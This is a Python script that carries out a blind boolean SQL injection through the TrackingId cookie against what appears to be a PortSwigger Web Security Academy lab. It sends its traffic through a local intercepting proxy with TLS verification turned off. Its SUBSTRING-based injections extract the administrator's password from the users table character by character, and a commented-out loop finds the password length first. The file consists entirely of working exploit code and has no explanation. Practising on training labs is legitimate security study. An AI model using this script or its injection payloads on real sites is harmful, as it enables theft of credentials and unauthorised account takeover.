import requests
import urllib3
import urllib.parse
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a6a00c20410aeb581168ea500e6003f.web-security-academy.net"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

initial_response = requests.get(url, proxies=proxies, verify=False)

# Extract cookies from the response
cookie_jar = initial_response.cookies
tracking_id = cookie_jar.get('TrackingId')
session_id = cookie_jar.get('session')

#check if the injection is true 
def chk_visited (respons):
	if ("Welcome back!" in respons.text):
		return True
	else:
		return False 
#exploit the website and return the response 
def req_visit (raw_injection):
	
	encoded_injection = urllib.parse.quote(raw_injection)

	# Send SQLi request with injected cookie
	cookies = {
	    'TrackingId': tracking_id + encoded_injection,
	    'session': session_id
	}

	injection_response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
	return injection_response

#determine the length of the password and used for only one time
# for i in range(99):
# 	raw_injection = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))={i}--"
# 	injection_response = req_visit(raw_injection)
# 	if (chk_visited(injection_response)):
# 		print ("the password length is ", i)
# 		len_password = i
# 		break


# Character set: alphanumeric only
charset = string.ascii_lowercase + string.digits
password = ""

print (charset)
# Bruteforce 20-character password
for i in range(1, 21):
    found = False
    for ch in charset:
        raw_injection = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{ch}'--"
        response = req_visit(raw_injection)
        if chk_visited(response):
            password += ch
            print(f"[+] Found char at position {i}: {ch}")
            found = True
            break
    if not found:
        print(f"[-] No matching character found at position {i}")
        break



print(f"\n[+] Extracted password: {password}")

